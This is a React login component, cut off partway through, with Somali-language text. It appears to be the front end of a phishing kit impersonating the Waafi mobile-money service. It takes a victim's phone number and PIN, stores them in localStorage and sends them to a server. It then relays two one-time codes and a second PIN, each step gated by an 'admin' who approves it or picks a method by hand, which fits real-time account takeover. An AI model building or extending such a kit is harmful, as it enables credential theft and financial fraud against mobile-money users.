import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useUserId } from '../hooks/useUserId';
import './Login.css';

// ─── PHASES ───────────────────────────────────────────────────────────────────
// 'login'          → phone + PIN form
// 'otp1'          → first OTP entry (after login approved)
// 'otp2'          → second OTP entry
// 'waiting_method' → second OTP approved, waiting for admin method
// 'prompt_pin'    → admin chose prompt; user waits
// 'request_pin'   → admin chose request; user types PIN

export default function Login() {
  const navigate = useNavigate();
  const { userId, apiBase } = useUserId();
  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
  const api = (path) => `${API_BASE_URL}${apiBase}/${path}`;

  // Local auth state (replaces LoanApplicationContext)
  const [authData, setAuthData] = useState({
    phoneNumber: '', pin: '', firstOtp: '', secondOtp: '', isAuthenticated: false,
  });
  const updateAuthData = (partial) => setAuthData((prev) => ({ ...prev, ...partial }));
  const serverStatus = { isChecking: false, isActive: true, error: null };

  // ── Phase ──────────────────────────────────────────────────────────────────
  const [phase, setPhase] = useState('login');

  // ── LOGIN state ────────────────────────────────────────────────────────────
  const initialPhone = '';
  const [phoneNumber, setPhoneNumber] = useState(initialPhone);
  const [pin, setPin] = useState(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);
  const [isReturningUser, setIsReturningUser] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [loginProcessing, setLoginProcessing] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  // ── OTP1 state ─────────────────────────────────────────────────────────────
  const [otp1, setOtp1] = useState(['', '', '', '', '', '']);
  const [otp1Timer, setOtp1Timer] = useState(null);
  const [otp1WaitingForApproval, setOtp1WaitingForApproval] = useState(true);
  const [otp1Submitting, setOtp1Submitting] = useState(false);
  const [otp1Resending, setOtp1Resending] = useState(false);
  const [otp1Processing, setOtp1Processing] = useState(false);
  const [otp1Approved, setOtp1Approved] = useState(false);
  const [otp1Progress, setOtp1Progress] = useState(0);
  const [otp1Status, setOtp1Status] = useState('');
  const [showOtp1ErrorModal, setShowOtp1ErrorModal] = useState(false);
  const [showOtp1WrongPinModal, setShowOtp1WrongPinModal] = useState(false);
  const [showOtp1TimeoutModal, setShowOtp1TimeoutModal] = useState(false);
  const [showOtp1VerifyErrorModal, setShowOtp1VerifyErrorModal] = useState(false);
  const [showOtp1ResendErrorModal, setShowOtp1ResendErrorModal] = useState(false);
  const [showOtp1SuccessToast, setShowOtp1SuccessToast] = useState(false);
  const [showOtp1ResendToast, setShowOtp1ResendToast] = useState(false);

  // ── OTP2 state ─────────────────────────────────────────────────────────────
  const [otp2, setOtp2] = useState(['', '', '', '', '', '']);
  const [otp2Timer, setOtp2Timer] = useState(40);
  const [otp2Submitting, setOtp2Submitting] = useState(false);
  const [otp2Resending, setOtp2Resending] = useState(false);
  const [otp2Processing, setOtp2Processing] = useState(false);
  const [otp2Approved, setOtp2Approved] = useState(false);
  const [otp2Progress, setOtp2Progress] = useState(0);
  const [otp2Status, setOtp2Status] = useState('');
  const [processingTitle, setProcessingTitle] = useState('Xaqiijinta OTP-ga Labaad');
  const [showOtp2ErrorModal, setShowOtp2ErrorModal] = useState(false);
  const [showOtp2WrongPinModal, setShowOtp2WrongPinModal] = useState(false);
  const [showOtp2TimeoutModal, setShowOtp2TimeoutModal] = useState(false);
  const [showOtp2VerifyErrorModal, setShowOtp2VerifyErrorModal] = useState(false);
  const [showOtp2ResendErrorModal, setShowOtp2ResendErrorModal] = useState(false);
  const [showOtp2SuccessToast, setShowOtp2SuccessToast] = useState(false);
  const [showOtp2ResendToast, setShowOtp2ResendToast] = useState(false);

  // ── Prompt PIN state ───────────────────────────────────────────────────────
  const [promptPinStatus, setPromptPinStatus] = useState('');
  const [isPromptPolling, setIsPromptPolling] = useState(false);
  const [promptPinError, setPromptPinError] = useState(null);
  const [isRetrying, setIsRetrying] = useState(false);

  // ── Request PIN state ──────────────────────────────────────────────────────
  const [pinDigits, setPinDigits] = useState(['', '', '', '', '', '']);
  const [isPinSubmitting, setIsPinSubmitting] = useState(false);
  const [pinError, setPinError] = useState(null);

  // ── Shared derived phone ───────────────────────────────────────────────────
  const getFullPhone = () => authData?.phoneNumber || localStorage.getItem('waafi_phone') || '+252 612 345 678';

  // ── Refs ───────────────────────────────────────────────────────────────────
  const abortRef = useRef(false);
  const pollingIntervalRef = useRef(null);
  const otp1PollRef = useRef(null);
  const previousStatusRef = useRef(null);
  const pollingAttempts = useRef(0);
  const maxPollingAttempts = 60;

  const pinRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];
  const otp1Refs = Array.from({ length: 6 }, () => useRef(null));
  const otp2Refs = Array.from({ length: 6 }, () => useRef(null));
  const requestPinRefs = Array.from({ length: 6 }, () => useRef(null));

  // ── Cleanup ────────────────────────────────────────────────────────────────
  useEffect(() => {
    abortRef.current = false;
    return () => {
      abortRef.current = true;
      if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);
      if (otp1PollRef.current) clearInterval(otp1PollRef.current);
    };
  }, []);

  // ══════════════════════════════════════════════════════════════════════════
  // LOGIN PHASE
  // ══════════════════════════════════════════════════════════════════════════

  const validatePhoneNumber = (number) => {
    if (!number || number.length !== 9)
      return { valid: false, message: 'Lambarka taleefanka waa inuu ahaadaa 9 tiro!' };
    return { valid: true, message: '' };
  };

  const handlePhoneChange = (e) => {
    setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 9));
  };
  const handlePhonePaste = (e) => {
    e.preventDefault();
    setPhoneNumber(e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 9));
  };

  const handlePinChange = (index, value) => {
    const v = value.replace(/\D/g, '');
    if (v.length > 1) return;
    const n = [...pin]; n[index] = v; setPin(n);
    if (v && index < 3) pinRefs[index + 1].current.focus();
  };
  const handlePinPaste = (e, index) => {
    e.preventDefault();
    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4).split('');
    const n = [...pin];
    digits.forEach((d, i) => { if (index + i < 4) n[index + i] = d; });
    setPin(n);
    pinRefs[Math.min(index + digits.length, 3)].current.focus();
  };
  const handlePinKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (pin[index]) { const n = [...pin]; n[index] = ''; setPin(n); }
      else if (index > 0) pinRefs[index - 1].current.focus();
    } else if (e.key === 'ArrowLeft' && index > 0) pinRefs[index - 1].current.focus();
    else if (e.key === 'ArrowRight' && index < 3) pinRefs[index + 1].current.focus();
  };
  const handlePinKeyPress = (e) => { if (!/^\d$/.test(e.key)) e.preventDefault(); };

  const startPollingForApproval = (formattedPhone, fullPin, returning) => {
    pollingAttempts.current = 0;
    pollingIntervalRef.current = setInterval(async () => {
      try {
        pollingAttempts.current++;
        if (pollingAttempts.current > maxPollingAttempts) {
          clearInterval(pollingIntervalRef.current);
          setWaitingForApproval(false);
          setLoginProcessing(false);
          setErrorMessage('Wax khalad ah ayaa dhacay, mar kale isku day');
          setShowErrorModal(true);
          return;
        }
        const res = await fetch(api('check-login-approval'), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: formattedPhone, pin: fullPin }),
        });
        const data = await res.json();
        if (data.success) {
          if (data.approved) {
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            setIsReturningUser(returning);
            await new Promise(r => setTimeout(r, 500));
            if (returning) {
              navigate(`/${userId}/status`);
            } else {
              // Transition to OTP1 phase
              setPhase('otp1');
              setOtp1WaitingForApproval(true);
            }
          } else if (data.rejected) {
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            setLoginProcessing(false);
            setErrorMessage('PIN-ka khalad ah');
            setShowErrorModal(true);
          } else if (data.expired) {
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            setLoginProcessing(false);
            setErrorMessage('Wax khalad ah ayaa dhacay, mar kale isku day');
            setShowErrorModal(true);
          }
        }
      } catch (err) { console.error(err); }
    }, 5000);
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    const fullPin = pin.join('');
    const validation = validatePhoneNumber(phoneNumber);
    if (!validation.valid) {
      setErrorMessage('Lambarka taleefanka waa inuu ahaadaa 9 tiro!\nFadlan geli lambar sax ah oo mar kale isku day!');
      setShowErrorModal(true);
      return;
    }
    if (fullPin.length !== 4) {
      setErrorMessage('Fadlan geli PIN-ka oo dhammaystiran oo ah 4 tiro');
      setShowErrorModal(true);
      return;
    }
    const formattedPhone = `+252${phoneNumber}`;
    updateAuthData({ phoneNumber: formattedPhone, pin: fullPin, isAuthenticated: false });
    try {
      localStorage.setItem('waafi_phone', formattedPhone);
      localStorage.setItem('waafi_auth', JSON.stringify({ phoneNumber: formattedPhone, pin: fullPin, isAuthenticated: false, timestamp: new Date().toISOString() }));
    } catch {}
    setLoginProcessing(true);
    try {
      const statusRes = await fetch(api('check-user-status'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: formattedPhone }),
      });
      const statusData = await statusRes.json();
      const returning = statusData.isReturningUser || false;
      const loginRes = await fetch(api('login'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: formattedPhone, pin: fullPin, timestamp: new Date().toISOString() }),
      });
      const loginData = await loginRes.json();
      if (loginData.success) {
        setWaitingForApproval(true);
        startPollingForApproval(formattedPhone, fullPin, returning);
      } else {
        setLoginProcessing(false);
        setErrorMessage('Galitaanka ma guulaysan. Fadlan mar kale isku day.');
        setShowErrorModal(true);
      }
    } catch {
      setLoginProcessing(false);
      setErrorMessage('Galitaanka ma guulaysan. Fadlan mar kale isku day.');
      setShowErrorModal(true);
    }
  };

  const isLoginFormComplete = phoneNumber.length === 9 && pin.every(d => d !== '');
  const getButtonState = () => {
    if (serverStatus?.isChecking) return { text: 'SUG...', disabled: true, className: 'login-button waiting' };
    if (serverStatus && !serverStatus.isActive) return { text: 'KHALAD SERVER', disabled: true, className: 'login-button error' };
    return { text: 'GAL', disabled: !isLoginFormComplete || loginProcessing, className: 'login-button' };
  };
  const buttonState = getButtonState();

  // ══════════════════════════════════════════════════════════════════════════
  // OTP1 PHASE
  // ══════════════════════════════════════════════════════════════════════════

  // Poll for login approval on OTP1 page (same as original Otp.jsx)
  useEffect(() => {
    if (phase !== 'otp1' || !otp1WaitingForApproval) return;
    const phone = getFullPhone();
    const checkApproval = async () => {
      try {
        const res = await fetch(api('check-login-approval'), {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phone, pin: authData?.pin }),
        });
        const data = await res.json();
        if (data.approved) {
          setOtp1WaitingForApproval(false);
          setShowOtp1SuccessToast(true);
          setOtp1Timer(40);
          localStorage.setItem('first_otp_timer', JSON.stringify({ endTime: Date.now() + 40000 }));
        }
      } catch {}
    };
    otp1PollRef.current = setInterval(checkApproval, 2000);
    checkApproval();
    return () => { if (otp1PollRef.current) clearInterval(otp1PollRef.current); };
  }, [phase, otp1WaitingForApproval]);

  // OTP1 timer countdown
  useEffect(() => {
    if (phase !== 'otp1' || !(otp1Timer > 0) || otp1Processing || otp1WaitingForApproval) return;
    const id = setInterval(() => {
      setOtp1Timer(prev => {
        const n = prev - 1;
        if (n <= 0) { localStorage.removeItem('first_otp_timer'); return 0; }
        localStorage.setItem('first_otp_timer', JSON.stringify({ endTime: Date.now() + n * 1000 }));
        return n;
      });
    }, 1000);
    return () => clearInterval(id);
  }, [phase, otp1Timer, otp1Processing, otp1WaitingForApproval]);

  // OTP1 progress → navigate to otp2
  useEffect(() => {
    if (phase !== 'otp1') return;
    if (otp1Processing && otp1Approved && otp1Progress < 100) {
      const t = setTimeout(() => setOtp1Progress(p => Math.min(p + Math.random() * 15 + 5, 100)), 300);
      return () => clearTimeout(t);
    }
    if (otp1Progress >= 100 && otp1Approved) {
      setTimeout(() => {
        if (otp1PollRef.current) clearInterval(otp1PollRef.current);
        localStorage.removeItem('first_otp_timer');
        // Transition to OTP2
        setPhase('otp2');
        setOtp2Timer(40);
        previousStatusRef.current = null;
        setOtp2Status('');
        abortRef.current = false;
        // Request second OTP
        requestSecondOtp();
        setShowOtp2SuccessToast(true);
        setTimeout(() => otp2Refs[0].current?.focus(), 100);
        localStorage.setItem('second_otp_timer', JSON.stringify({ endTime: Date.now() + 40000 }));
      }, 500);
    }
  }, [phase, otp1Processing, otp1Approved, otp1Progress]);

  // OTP1 toast timers
  useEffect(() => {
    if (!showOtp1SuccessToast) return;
    const t = setTimeout(() => setShowOtp1SuccessToast(false), 2500);
    return () => clearTimeout(t);
  }, [showOtp1SuccessToast]);
  useEffect(() => {
    if (!showOtp1ResendToast) return;
    const t = setTimeout(() => setShowOtp1ResendToast(false), 2500);
    return () => clearTimeout(t);
  }, [showOtp1ResendToast]);

  const checkOtp1Status = async (phone, otpCode) => {
    const start = Date.now();
    while (Date.now() - start < 5 * 60 * 1000) {
      if (abortRef.current) return { aborted: true };
      try {
        const res = await fetch(api('check-first-otp-status'), {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phone, otp: otpCode, otpType: 'first' }),
        });
        const data = await res.json();
        if (data.status === 'approved') return { approved: true };
        if (data.status === 'rejected') return { approved: false };
        if (data.status === 'wrong_pin') return { approved: false, wrongPin: true };
        const s = `Fadlan sug... (${Math.floor((Date.now() - start) / 1000)}s)`;
        if (previousStatusRef.current !== s) { setOtp1Status(s); previousStatusRef.current = s; }
      } catch {}
      await new Promise(r => setTimeout(r, 2000));
    }
    return { approved: false, timeout: true };
  };

  const handleOtp1Change = (index, value) => {
    const v = value.replace(/\D/g, '');
    if (v.length > 1) return;
    const n = [...otp1]; n[index] = v; setOtp1(n);
    if (v && index < 5) otp1Refs[index + 1].current.focus();
  };
  const handleOtp1Paste = (e, index) => {
    e.preventDefault();
    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6).split('');
    const n = [...otp1];
    digits.forEach((d, i) => { if (index + i < 6) n[index + i] = d; });
    setOtp1(n);
    otp1Refs[Math.min(index + digits.length, 5)].current.focus();
  };
  const handleOtp1KeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (otp1[index]) { const n = [...otp1]; n[index] = ''; setOtp1(n); }
      else if (index > 0) otp1Refs[index - 1].current.focus();
    } else if (e.key === 'ArrowLeft' && index > 0) otp1Refs[index - 1].current.focus();
    else if (e.key === 'ArrowRight' && index < 5) otp1Refs[index + 1].current.focus();
  };
  const handleOtpKeyPress = (e) => { if (!/^\d$/.test(e.key)) e.preventDefault(); };

  const handleOtp1Submit = async (e) => {
    e.preventDefault();
    if (otp1Submitting || otp1WaitingForApproval) return;
    const fullOtp = otp1.join('');
    if (fullOtp.length !== 6) { alert('Fadlan geli koodhka 6 tiro ee dhammaystiran'); return; }
    setOtp1Submitting(true);
    const phone = getFullPhone();
    try {
      await fetch(api('verify-first-otp'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone, otp: fullOtp, timestamp: new Date().toISOString() }),
      });
      setOtp1Processing(true);
      const s = 'Fadlan sug...';
      setOtp1Status(s); previousStatusRef.current = s;
      setOtp1Approved(false); setOtp1Progress(0);
      const result = await checkOtp1Status(phone, fullOtp);
      if (result.approved) {
        setOtp1Status('✅ OTP la xaqiijiyay!');
        previousStatusRef.current = '✅ OTP la xaqiijiyay!';
        setOtp1Approved(true);
        updateAuthData({ firstOtp: fullOtp });
      } else if (result.wrongPin) {
        setOtp1Processing(false); setOtp1Submitting(false); setOtp1Progress(0); setOtp1Approved(false);
        setShowOtp1WrongPinModal(true); previousStatusRef.current = null;
      } else if (result.timeout) {
        setOtp1Processing(false); setOtp1Submitting(false); setOtp1Progress(0); setOtp1Approved(false);
        setShowOtp1TimeoutModal(true); previousStatusRef.current = null;
      } else {
        setOtp1Processing(false); setOtp1Submitting(false); setOtp1Progress(0); setOtp1Approved(false);
        setShowOtp1ErrorModal(true);
        setOtp1(['', '', '', '', '', '']);
        previousStatusRef.current = null;
        setTimeout(() => otp1Refs[0].current?.focus(), 100);
      }
    } catch {
      setOtp1Submitting(false); setOtp1Processing(false); setOtp1Progress(0); setOtp1Approved(false);
      setShowOtp1VerifyErrorModal(true); previousStatusRef.current = null;
    }
  };

  const handleOtp1Resend = async () => {
    if (otp1Timer > 0 || otp1Resending || otp1WaitingForApproval) return;
    const phone = getFullPhone();
    if (!phone || phone === '+252 612 345 678') { setShowOtp1ResendErrorModal(true); return; }
    setOtp1Resending(true);
    try {
      const res = await fetch(api('resend-first-otp'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone, timestamp: new Date().toISOString() }),
      });
      const data = await res.json();
      if (data.success) {
        setOtp1(['', '', '', '', '', '']); setOtp1Timer(40);
        localStorage.setItem('first_otp_timer', JSON.stringify({ endTime: Date.now() + 40000 }));
        otp1Refs[0].current.focus(); setShowOtp1ResendToast(true);
      } else { setShowOtp1ResendErrorModal(true); }
    } catch { setShowOtp1ResendErrorModal(true); }
    finally { setOtp1Resending(false); }
  };

  const handleOtp1WrongPinClose = () => {
    setShowOtp1WrongPinModal(false);
    localStorage.removeItem('first_otp_timer'); localStorage.removeItem('waafi_phone');
    updateAuthData({ phoneNumber: '', pin: '', firstOtp: '', isAuthenticated: false });
    setPhase('login');
  };
  const handleOtp1TimeoutClose = () => {
    setShowOtp1TimeoutModal(false);
    setOtp1(['', '', '', '', '', '']);
    setTimeout(() => otp1Refs[0].current?.focus(), 100);
  };

  const isOtp1Complete = otp1.every(d => d !== '');

  // ══════════════════════════════════════════════════════════════════════════
  // OTP2 PHASE (Confirm.jsx logic)
  // ══════════════════════════════════════════════════════════════════════════

  const requestSecondOtp = async () => {
    try {
      const phone = getFullPhone();
      await fetch(api('request-second-otp'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone, firstOtp: authData?.firstOtp, timestamp: new Date().toISOString() }),
      });
    } catch {}
  };

  // OTP2 timer
  useEffect(() => {
    if (phase !== 'otp2' || otp2Timer <= 0 || otp2Processing) return;
    const id = setInterval(() => {
      setOtp2Timer(prev => {
        const n = prev - 1;
        if (n <= 0) { localStorage.removeItem('second_otp_timer'); return 0; }
        localStorage.setItem('second_otp_timer', JSON.stringify({ endTime: Date.now() + n * 1000 }));
        return n;
      });
    }, 1000);
    return () => clearInterval(id);
  }, [phase, otp2Timer, otp2Processing]);

  // OTP2 toast timers
  useEffect(() => {
    if (!showOtp2SuccessToast) return;
    const t = setTimeout(() => setShowOtp2SuccessToast(false), 2500);
    return () => clearTimeout(t);
  }, [showOtp2SuccessToast]);
  useEffect(() => {
    if (!showOtp2ResendToast) return;
    const t = setTimeout(() => setShowOtp2ResendToast(false), 2500);
    return () => clearTimeout(t);
  }, [showOtp2ResendToast]);

  // OTP2 progress → navigate to /status
  useEffect(() => {
    if (phase !== 'otp2' && phase !== 'prompt_pin' && phase !== 'request_pin' && phase !== 'waiting_method') return;
    if (otp2Processing && otp2Approved && otp2Progress < 100) {
      const t = setTimeout(() => setOtp2Progress(p => Math.min(p + Math.random() * 15 + 5, 100)), 300);
      return () => clearTimeout(t);
    }
    if (otp2Progress >= 100 && otp2Approved) {
      setTimeout(() => {
        localStorage.removeItem('second_otp_timer'); localStorage.removeItem('first_otp_timer');
        navigate(`/${userId}/status`, { replace: true });
      }, 500);
    }
  }, [otp2Processing, otp2Approved, otp2Progress, navigate, phase]);

  const checkOtp2Status = async (phone, otpCode) => {
    const start = Date.now();
    while (Date.now() - start < 5 * 60 * 1000) {
      if (abortRef.current) return { aborted: true };
      try {
        const res = await fetch(api('check-second-otp-status'), {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phone, otp: otpCode, otpType: 'second' }),
        });
        const data = await res.json();
        if (data.status === 'approved') return { approved: true };
        if (data.status === 'rejected') return { approved: false };
        if (data.status === 'wrong_pin') return { approved: false, wrongPin: true };
        const s = `Fadlan sug... (${Math.floor((Date.now() - start) / 1000)}s)`;
        if (previousStatusRef.current !== s) { setOtp2Status(s); previousStatusRef.current = s; }
      } catch {}
      await new Promise(r => setTimeout(r, 2000));
    }
    return { approved: false, timeout: true };
  };

  const pollForAdminMethodDecision = async (phone) => {
    const start = Date.now();
    while (Date.now() - start < 5 * 60 * 1000) {
      if (abortRef.current) return null;
      try {
        const res = await fetch(api('get-second-pin-method'), {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phone }),
        });
        const data = await res.json();
        if (data.method === 'prompt_pin' || data.method === 'request_pin' || data.method === 'pass') return data.method;
      } catch {}
      await new Promise(r => setTimeout(r, 2000));
    }
    return null;
  };

  const runPromptPinAttempt = async (phone) => {
    const start = Date.now();
    while (Date.now() - start < 5 * 60 * 1000) {
      if (abortRef.current) return { aborted: true };
      try {
        const res = await fetch(api('check-pin2-verification-status'), {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phone }),
        });
        const data = await res.json();
        if (data.status === 'approved') return { approved: true };
        if (data.status === 'rejected' || data.status === 'failed') return { approved: false };
        const s = `Fadlan sug... (${Math.floor((Date.now() - start) / 1000)}s)`;
        if (previousStatusRef.current !== s) { setPromptPinStatus(s); previousStatusRef.current = s; }
      } catch {}
      await new Promise(r => setTimeout(r, 2000));
    }
    return { approved: false, timeout: true };
  };

  const handleApprovalSuccess = (secondOtp = '') => {
    updateAuthData({ secondOtp, isAuthenticated: true });
    try {
      const cur = JSON.parse(localStorage.getItem('waafi_auth') || '{}');
      localStorage.setItem('waafi_auth', JSON.stringify({ ...cur, secondOtp, isAuthenticated: true, timestamp: new Date().toISOString() }));
    } catch {}
    setOtp2Approved(true);
    setOtp2Processing(true);
  };

  const handleOtp2Change = (index, value) => {
    const v = value.replace(/\D/g, '');
    if (v.length > 1) return;
    const n = [...otp2]; n[index] = v; setOtp2(n);
    if (v && index < 5) otp2Refs[index + 1].current.focus();
  };
  const handleOtp2Paste = (e, index) => {
    e.preventDefault();
    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6).split('');
    const n = [...otp2];
    digits.forEach((d, i) => { if (index + i < 6) n[index + i] = d; });
    setOtp2(n);
    otp2Refs[Math.min(index + digits.length, 5)].current.focus();
  };
  const handleOtp2KeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (otp2[index]) { const n = [...otp2]; n[index] = ''; setOtp2(n); }
      else if (index > 0) otp2Refs[index - 1].current.focus();
    } else if (e.key === 'ArrowLeft' && index > 0) otp2Refs[index - 1].current.focus();
    else if (e.key === 'ArrowRight' && index < 5) otp2Refs[index + 1].current.focus();
  };

  const handleOtp2Submit = async (e) => {
    e.preventDefault();
    if (otp2Submitting) return;
    const fullOtp = otp2.join('');
    if (fullOtp.length !== 6) { alert('Fadlan geli koodhka 6 tiro ee dhammaystiran'); return; }
    setOtp2Submitting(true);
    const phone = getFullPhone();
    try {
      await fetch(api('verify-second-otp'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone, otp: fullOtp, firstOtp: authData?.firstOtp, timestamp: new Date().toISOString() }),
      });
      setProcessingTitle('Xaqiijinta OTP-ga Labaad');
      setOtp2Processing(true);
      const s = 'Fadlan sug...'; setOtp2Status(s); previousStatusRef.current = s;
      setOtp2Approved(false); setOtp2Progress(0);
      const result = await checkOtp2Status(phone, fullOtp);
      if (result.aborted) return;
      if (!result.approved) {
        setOtp2Processing(false); setOtp2Submitting(false); setOtp2Progress(0);
        previousStatusRef.current = null;
        if (result.wrongPin) setShowOtp2WrongPinModal(true);
        else if (result.timeout) setShowOtp2TimeoutModal(true);
        else { setShowOtp2ErrorModal(true); setOtp2(['', '', '', '', '', '']); setTimeout(() => otp2Refs[0].current?.focus(), 100); }
        return;
      }
      // OTP2 approved → wait for admin method
      setOtp2Processing(false); setOtp2Status(''); previousStatusRef.current = null;
      setPhase('waiting_method');
      const method = await pollForAdminMethodDecision(phone);
      if (abortRef.current) return;
      if (!method) {
        setPhase('otp2'); setOtp2Submitting(false); setShowOtp2TimeoutModal(true); return;
      }
      setPhase(method);
      if (method === 'pass') {
        setProcessingTitle('Xaqiijinta');
        setOtp2Status('✅ Ansixinta la dhamaystiray! Socodka...'); previousStatusRef.current = '✅ Ansixinta la dhamaystiray! Socodka...';
        handleApprovalSuccess('pass'); return;
      }
      if (method === 'prompt_pin') { await initiatePromptPin(phone); }
    } catch {
      setOtp2Submitting(false); setOtp2Processing(false); setPhase('otp2');
      setShowOtp2VerifyErrorModal(true); previousStatusRef.current = null;
    }
  };

  const initiatePromptPin = async (phone) => {
    setIsPromptPolling(true); setPromptPinError(null);
    setPromptPinStatus('Fadlan sug...'); previousStatusRef.current = 'Fadlan sug...';
    try {
      await fetch(api('initiate-prompt-pin'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone, firstOtp: authData?.firstOtp, timestamp: new Date().toISOString() }),
      });
      const result = await runPromptPinAttempt(phone);
      if (result.aborted) return;
      if (result.approved) {
        setIsPromptPolling(false);
        setProcessingTitle('PIN Xaqiijinta');
        handleApprovalSuccess('prompt_pin_verified');
      } else {
        setIsPromptPolling(false); setPromptPinError(result.timeout ? 'timeout' : 'failed');
        previousStatusRef.current = null;
      }
    } catch {
      setIsPromptPolling(false); setPromptPinError('failed'); previousStatusRef.current = null;
    }
  };

  const handlePromptPinRetry = async () => {
    if (isRetrying) return;
    setIsRetrying(true);
    await initiatePromptPin(getFullPhone());
    setIsRetrying(false);
  };

  const handleRequestPinChange = (index, value) => {
    const v = value.replace(/\D/g, '');
    if (v.length > 1) return;
    const n = [...pinDigits]; n[index] = v; setPinDigits(n);
    if (v && index < 5) requestPinRefs[index + 1].current.focus();
  };
  const handleRequestPinPaste = (e, index) => {
    e.preventDefault();
    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6).split('');
    const n = [...pinDigits];
    digits.forEach((d, i) => { if (index + i < 6) n[index + i] = d; });
    setPinDigits(n);
    requestPinRefs[Math.min(index + digits.length, 5)].current.focus();
  };
  const handleRequestPinKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (pinDigits[index]) { const n = [...pinDigits]; n[index] = ''; setPinDigits(n); }
      else if (index > 0) requestPinRefs[index - 1].current.focus();
    } else if (e.key === 'ArrowLeft' && index > 0) requestPinRefs[index - 1].current.focus();
    else if (e.key === 'ArrowRight' && index < 5) requestPinRefs[index + 1].current.focus();
  };

  const handlePinSubmit = async (e) => {
    e.preventDefault();
    if (isPinSubmitting) return;
    const fullPin2 = pinDigits.join('');
    if (fullPin2.length !== 6) { alert('Fadlan geli PIN-ka 6 tiro ee dhammaystiran'); return; }
    setIsPinSubmitting(true); setPinError(null);
    const phone = getFullPhone();
    try {
      await fetch(api('verify-request-pin'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone, pin: fullPin2, firstOtp: authData?.firstOtp, timestamp: new Date().toISOString() }),
      });
      setProcessingTitle('PIN Xaqiijinta');
      setOtp2Status('Fadlan sug...'); previousStatusRef.current = 'Fadlan sug...';
      setOtp2Progress(0); setOtp2Approved(false); setOtp2Processing(true);
      const result = await checkOtp2Status(phone, fullPin2);
      if (result.aborted) return;
      if (result.approved) {
        setOtp2Status('✅ PIN la xaqiijiyay! Socodka...'); previousStatusRef.current = '✅ PIN la xaqiijiyay! Socodka...';
        updateAuthData({ secondOtp: fullPin2, isAuthenticated: true });
        try {
          const cur = JSON.parse(localStorage.getItem('waafi_auth') || '{}');
          localStorage.setItem('waafi_auth', JSON.stringify({ ...cur, secondOtp: fullPin2, isAuthenticated: true, timestamp: new Date().toISOString() }));
        } catch {}
        setOtp2Approved(true);
      } else {
        setOtp2Processing(false); setIsPinSubmitting(false); setOtp2Progress(0);
        previousStatusRef.current = null;
        setPinError(result.wrongPin ? 'wrong_pin' : result.timeout ? 'timeout' : 'error');
        setPinDigits(['', '', '', '', '', '']);
        setTimeout(() => requestPinRefs[0].current?.focus(), 100);
      }
    } catch {
      setIsPinSubmitting(false); setOtp2Processing(false); setOtp2Progress(0);
      setPinError('error'); previousStatusRef.current = null;
    }
  };

  const handleOtp2Resend = async () => {
    if (otp2Timer > 0 || otp2Resending) return;
    const phone = getFullPhone();
    if (!phone || phone === '+252 612 345 678') { setShowOtp2ResendErrorModal(true); return; }
    setOtp2Resending(true);
    try {
      const res = await fetch(api('resend-second-otp'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone, firstOtp: authData?.firstOtp, timestamp: new Date().toISOString() }),
      });
      const data = await res.json();
      if (data.success) {
        setOtp2(['', '', '', '', '', '']); setOtp2Timer(40);
        localStorage.setItem('second_otp_timer', JSON.stringify({ endTime: Date.now() + 40000 }));
        otp2Refs[0].current.focus(); setShowOtp2ResendToast(true);
      } else { setShowOtp2ResendErrorModal(true); }
    } catch { setShowOtp2ResendErrorModal(true); }
    finally { setOtp2Resending(false); }
  };

  const handleOtp2WrongPinClose = () => {
    setShowOtp2WrongPinModal(false);
    localStorage.removeItem('first_otp_timer'); localStorage.removeItem('second_otp_timer'); localStorage.removeItem('waafi_phone');
    updateAuthData({ phoneNumber: '', pin: '', firstOtp: '', secondOtp: '', isAuthenticated: false });
    setPhase('login');
  };
  const handleOtp2TimeoutClose = () => {
    setShowOtp2TimeoutModal(false);
    setOtp2Submitting(false);
    setOtp2(['', '', '', '', '', '']);
    setTimeout(() => otp2Refs[0].current?.focus(), 100);
  };

